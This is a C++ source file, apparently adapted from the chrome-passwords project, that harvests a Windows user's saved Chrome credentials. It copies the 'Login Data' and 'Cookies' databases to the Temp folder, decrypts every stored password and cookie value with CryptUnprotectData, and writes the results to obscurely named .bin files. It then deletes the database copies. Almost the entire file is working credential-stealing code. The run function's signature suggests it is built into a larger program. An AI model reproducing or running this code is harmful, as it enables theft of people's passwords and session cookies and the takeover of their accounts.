/*
	Author: Adnan Alhomssi
	URL: https://github.com/adnanonline/chrome-passwords
	License: GNU GPL V3
*/
#include "..\..\stdafx.h"

using namespace std;

string strTempPath("");

stringstream debug(string(""));
/*
** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
** column to DATA_BLOB data structure which is convient for Win32API CryptUnprotectData function
*/
stringstream getPass(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		cout << "statement failed rc = " << rc << endl;
		return dump;
	}
	cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/
	rc = sqlite3_step(pStmt);
	cout << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		string decrypted("<failed>");

		DATA_BLOB encryptedPass, decryptedPass;

		try {
			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

			SetLastError(0);
			BOOL result = CryptUnprotectData(
				&encryptedPass, // In Data
				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
				NULL,           // Optional entropy
				NULL,           // Reserved
				NULL,           // Here, the optional
								// prompt structure is not
								// used.
				0,
				&decryptedPass);

			std::string strFailed("<failed>");
			if (!result)
			{
				std::stringstream temp;
				temp << "<failed 0x" << std::hex << result << ">";
				decrypted = temp.str();
			}

			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
		}
		catch (...)
		{

		}

		dump << "Url     :" << sqlite3_column_text(pStmt, 0) << endl;
		dump << "Username:" << (char *)sqlite3_column_text(pStmt, 1) << endl;
  	    dump << "Password:" << decrypted << endl;
		dump << endl;
		dump << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
stringstream getCookies(
	sqlite3 *db
) {
	stringstream dump(string("")); // String stream for our output
	const char *zSql = "SELECT HOST_KEY,path,encrypted_value,expires_utc from cookies";
	sqlite3_stmt *pStmt;
	int rc;

	/* Compile the SELECT statement into a virtual machine. */
	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		cout << "statement failed rc = " << rc << endl;
		return dump;
	}
	cout << "statement prepared " << endl;

	/* So call sqlite3_step() once
	** only. Normally, we would keep calling sqlite3_step until it
	** returned something other than SQLITE_ROW.
	*/

	rc = sqlite3_step(pStmt);
	cout << "RC: " << rc << endl;
	while (rc == SQLITE_ROW) {
		string decrypted("<failed>");

		DATA_BLOB encryptedPass, decryptedPass;
		try {
			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

			CryptUnprotectData(
				&encryptedPass, // In Data
				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
				NULL,           // Optional entropy
				NULL,           // Reserved
				NULL,           // Here, the optional
								// prompt structure is not
								// used.
				0,
				&decryptedPass);
			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
		}
		catch (...)
		{
		}

		unsigned long long int expires = sqlite3_column_int64(pStmt, 3);

		dump << endl;
		dump << "Host   :" << sqlite3_column_text(pStmt, 0) << endl;
		dump << "Path   :" << (char *)sqlite3_column_text(pStmt, 1) << endl;
		dump << "Expires:" << expires << endl;
		dump << "Cookie :" << decrypted << endl;
		rc = sqlite3_step(pStmt);
	}

	/* Finalize the statement (this releases resources allocated by
	** sqlite3_prepare() ).
	*/
	rc = sqlite3_finalize(pStmt);

	return dump;
}
sqlite3* getDBHandler(char* dbFilePath) {
	sqlite3 *db;
	int rc = sqlite3_open((strTempPath + dbFilePath).c_str(), &db);
	if (rc)
	{
		cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		cout << dbFilePath << " DB Opened." << endl << endl;
		return db;
	}
}
//relative to chrome directory
bool copyDB(char *source, char *dest) {
	//Form path for Chrome's Login Data 
	string path = getenv("LOCALAPPDATA");
//	path.append("\\Google\\Chrome\\User Data\\Default\\");
	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
	path.append(source);

	string destPath = strTempPath + dest;

	//copy the sqlite3 db from chrome directory 
	//as we are not allowed to open it directly from there (chrome could also be running)
	ifstream  src(path, std::ios::binary);
	ofstream  dst(destPath, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
	return true; //ToDo: error handling
}
int deleleteDB(const char *fileName) {
	try {
		string filePath = strTempPath + fileName;

		if (remove(filePath.c_str()) != 0)
			cout << "Could not delete " << filePath << endl;
		else
			cout << filePath << " deleted... Bye bye" << endl;

		return 0;
	}
	catch (...)
	{
	}

	return 0;
}

void PasswordRun(LPSTR lpCmdLine)
{
	{
		strTempPath = string(getenv("LOCALAPPDATA")) + "\\Temp\\";

		std::istringstream ss(lpCmdLine);
		std::istream_iterator<std::string> begin(ss), end;

		//putting all the tokens in the vector
		std::vector<std::string> arrayTokens(begin, end);

		std::vector<const char*> argv;
		for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
		{
			argv.push_back((*itr).c_str());
		}

		int argc = argv.size();

		int rc;
		try
		{
			char* tempDB = "p8791.db";

			// Open Database
			cout << "Copying db ..." << endl;
			copyDB("Login Data", tempDB);
			sqlite3 *passwordsDB = getDBHandler(tempDB);
			stringstream passwords = getPass(passwordsDB);
			//	cout << passwords.str();

			string fileName = strTempPath + "p8791.bin";
			std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
			myfile << passwords.str();
			myfile.close();

			if (sqlite3_close(passwordsDB) == SQLITE_OK)
				cout << "DB connection closed properly" << endl;
			else
				cout << "Failed to close DB connection" << endl;

			deleleteDB(tempDB);
		}
		catch(...)
		{

		}

		bool flagCookies = false, flagPause = false;
		for (int i = 0; i < argc; i++) {
			if (strlen(argv[i]) < 2)continue;
			switch (argv[i][1]) {
			case 'c':
				flagCookies = true;
				break;
			case 'p':
				flagPause = true;
				break;
			}
		}
		if (flagCookies) {
			try
			{
				char* tempDB = "c8791.db";

				copyDB("Cookies", tempDB);
				sqlite3 *cookiesDb = getDBHandler(tempDB);
				stringstream cookies = getCookies(cookiesDb);

				string fileName = strTempPath + "c8791.bin";
				std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
				myfile << cookies.str();
				myfile.close();

				if (sqlite3_close(cookiesDb) == SQLITE_OK)
					cout << "DB connection closed properly" << endl;
				else
					cout << "Failed to close DB connection" << endl;

				deleleteDB(tempDB);
			}
			catch(...)
			{

			}
		}

		if (!flagPause)
			cin.get();
	}
}